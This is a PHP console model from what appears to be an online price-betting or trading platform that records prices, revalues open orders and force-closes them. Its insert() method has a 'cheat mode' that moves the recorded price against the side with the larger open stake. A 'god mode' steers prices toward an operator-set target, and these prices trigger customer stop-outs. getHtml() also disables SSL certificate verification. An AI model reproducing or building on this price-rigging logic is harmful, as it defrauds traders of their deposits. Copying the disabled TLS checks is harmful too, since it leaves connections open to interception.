<?php

namespace console\models;

use Yii;
use common\models\Order;
use common\models\Product;
use common\models\DataAll;
use common\helpers\Curl;
use common\helpers\StringHelper;

class Gather extends \yii\base\Object
{
    use \common\traits\ChisWill;

    public $productList = [];
    protected $updateMap = [];
    protected $switchMap = [];
    protected $faker;
    protected $productArr = ['ce' => 1, 'hi' => 2, 'ne' => 3];
    protected $idArr = ['ce' => '1,2', 'hi' => '3,4,5,6', 'ne' => '7,8,9'];
    protected $now;

    public function init()
    {
        parent::init();
        $this->now = time();
        $this->productList = array_intersect_key($this->productList, array_flip(config('productList')));
    }

    protected function uniqueInsert($name, $data)
    {
        $row = self::db("SELECT
            price,
            time
        FROM
            data_{$name}
        ORDER BY
            id DESC
        LIMIT 1")->queryOne();
        // 价格不同或是间隔10s
        if ($row['price'] != $data['price'] || strtotime($data['time']) - strtotime($row['time']) >= 10) {
            $this->insert($name, $data);
        }
    }

    protected function insert($name, $data)
    {
        try {
            // 是否开启作弊模式
            if (($switch = option('risk_switch')) && isset($this->switchMap[$name])) {
                $riskProduct = option('risk_product');
                if (isset($riskProduct) && $riskProduct[$name] == 1) {
                    $riseQuery = Order::find()->joinWith('product')->where(['order_state' => Order::ORDER_POSITION, 'product.table_name' => $name, 'sign_state' => Order::SIGN_NO])->select('SUM(hand * order.one_profit) hand');
                    $downQuery = clone $riseQuery;
                    $riseQuery->andWhere(['rise_fall' => Order::RISE]);
                    $downQuery->andWhere(['rise_fall' => Order::FALL]);
                    $rise = $riseQuery->one()->hand ?: 0;
                    $down = $downQuery->one()->hand ?: 0;
                    if ($rise != $down) {
                        $wave = $rise > $down ? -1 : 1;
                        if (strpos($data['price'], '.') !== false) {
                            list($int, $point) = explode('.', $data['price']);
                            $point = pow(10, -1 * strlen($point));
                        } else {
                            $point = 1;
                        }
                        // 获取行情信息
                        $dataInfo = DataAll::findOne($name);
                        $data['price'] = $dataInfo->price;
                        $data['price'] += $point * $wave * intval(mt_rand(50, 210) / 50);
                    }
                } 
            }
            // 是否开启上帝模式
            if (($control = option('risk_product_control')) && isset($control[$name])) {
                file_put_contents('./bruce.log', json_encode($control).PHP_EOL, FILE_APPEND);
                $control = $control[$name];
                // 获取行情信息
                $restTime = $control['start'] + $control['time'] - $this->now;
                // 当没过期时
                if ($restTime >= 0) {
                    $restTime == 0 && $restTime = 1;
                    if (strpos($control['price'], '.') !== false) {
                        list($int, $point) = explode('.', $control['price']);
                        $point = strlen($point);
                    } else {
                        $point = 0;
                    }
                    $dataInfo = DataAll::findOne($name);
                    $changePrice = sprintf('%.' . $point . 'f', ($control['target'] - $dataInfo->price) / $restTime);
                    $data['price'] = $dataInfo->price + $changePrice;
                    $data['time'] = date('Y-m-d H:i:s', $this->now);
                    file_put_contents('./high.log', $data['price'].'----'.$data['time'].PHP_EOL, FILE_APPEND);
                }else if(abs($restTime) <=100){

                    if (strpos($control['price'], '.') !== false) {
                        list($int, $point) = explode('.', $control['price']);
                        $point = strlen($point);
                    } else {
                        $point = 0;
                    }
                    $restTime = abs($restTime);
                    $dataInfo = DataAll::findOne($name);
                    if($control['target'] > $control['price']){//拉涨
                        $changePrice = sprintf('%.' . $point . 'f', ($control['price'] - $dataInfo->price) / $restTime);
                    }else{//拉跌
                        $changePrice = sprintf('%.' . $point . 'f', ($dataInfo->price - $control['price']) / $restTime);
                    }
                    $data['price'] = $control['target'] - $changePrice;
                    $data['time'] = date('Y-m-d H:i:s', $this->now);
                    file_put_contents('./low.log', $data['price'].'----'.$data['time'].PHP_EOL, FILE_APPEND);
                }
            }
            if (self::dbInsert('data_' . $name, ['price' => $data['price'], 'time' => $data['time']])) {
                $this->updateMap[$name] = $data;
            } else {
               self::log($data, 'gather/' . $name);
            }
        } catch (\yii\db\IntegrityException $e) {
            // 唯一索引冲突才会进这，什么都不必做
        }
    }

    protected function afterInsert()
    {
        $priceJson = @file_get_contents(Yii::getAlias('@frontend/web/price.json')) ?: '{}';
        $priceJson = json_decode($priceJson, true);
        foreach ($this->updateMap as $tableName => $info) {
            // 更新 data_all 的最新价格
            self::dbUpdate('data_all', $info, ['name' => $tableName]);
            // 将所有更新的价格写入文件
            $priceJson[$tableName] = $info['price'];
        }
        file_put_contents(Yii::getAlias('@frontend/web/price.json'), json_encode($priceJson));
    }

    protected function listen($tableName = 'ce')
    {
        $this->afterInsert();
        // 更新所有持仓订单的浮亏
        self::db('  UPDATE
                        `order` o,
                        product p,
                        data_all a
                    SET
                        sell_price = a.price,
                        profit = IF (
                            o.rise_fall = ' . Order::RISE . ',
                            a.price - o.price,
                            o.price - a.price
                        ) * o.hand * o.one_profit
                    WHERE
                        a.name = p.`table_name`
                    AND o.product_id = p.id
                    AND o.order_state =  ' . Order::ORDER_POSITION . '
                    AND sell_price != a.price')
        ->execute();

        // 获取所有品类当前交易状态
        $productMap = $this->getAllTradeTime();
        $extra = [];
        foreach ($productMap as $product => $isTrade) {
            if ($isTrade === true) {
                $extra[] = $product;
            }
        }
        if ($extra) {
            $extraWhere = ' OR (order_state = ' . Order::ORDER_POSITION . ' and product_id in (' . implode(',', $extra) . '))';
        } else {
            $extraWhere = '';
        }

        $string = $this->idArr[$tableName];
        // 获取所有止盈止损订单ID
        $ids = self::db('SELECT id from `order` where (order_state = ' . Order::ORDER_POSITION . ' AND (
            (profit + deposit <= 0 OR profit >= deposit) OR (profit <= stop_loss_price * -1 AND stop_loss_point <> 0) OR (profit >= stop_profit_price AND stop_profit_point <> 0)))' . $extraWhere)->queryAll();
        array_walk($ids, function ($value) {
            Order::sellOrder($value['id'], true);
        });
    }

    protected function getAllTradeTime()
    {
        $data = [];
        $products = Product::find()->where(['force_sell' => Product::FORCE_SELL_YES])->select(['id'])->asArray()->all();
        foreach ($products as $product) {
            $data[$product['id']] = Product::isLastTradeTime($product['id'], 60);
        }
        return $data;
    }

    protected function getHtml($url, $data = null)
    {
        return Curl::get($url, [
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
    }
}
